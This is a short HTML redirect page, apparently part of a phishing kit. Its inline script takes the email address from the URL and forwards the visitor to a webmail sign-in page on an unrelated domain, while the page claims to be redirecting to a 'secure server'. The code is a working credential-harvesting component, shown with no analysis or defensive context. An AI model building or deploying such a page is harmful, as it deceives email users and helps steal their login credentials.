<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <script>
    // Automatically get email from query string
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email');
    if (email) {
      window.location.href = `https://live-checker.de/webmail-login-account/weblogin/account/signin.html?email=${encodeURIComponent(email)}`;
    } else {
      document.write("Missing email address");
    }
  </script>
  <title>Redirecting...</title>
</head>
<body>
  <p>Redirecting to secure server, please wait...</p>
</body>
</html>
